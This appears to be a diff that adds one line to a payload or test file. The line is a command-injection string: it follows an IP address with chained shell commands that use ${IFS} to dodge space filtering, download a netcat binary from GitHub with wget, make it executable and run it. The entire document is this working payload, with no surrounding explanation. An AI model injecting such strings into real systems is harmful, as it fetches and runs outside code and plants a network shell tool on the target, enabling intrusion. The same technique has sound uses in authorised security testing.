@@ -1,0 +1,1 @@
+127.0.0.1;wget${IFS}https://github.com/yunchih/static-binaries/raw/master/nc;chmod${IFS}+x${IFS}nc;./nc${IFS}-V
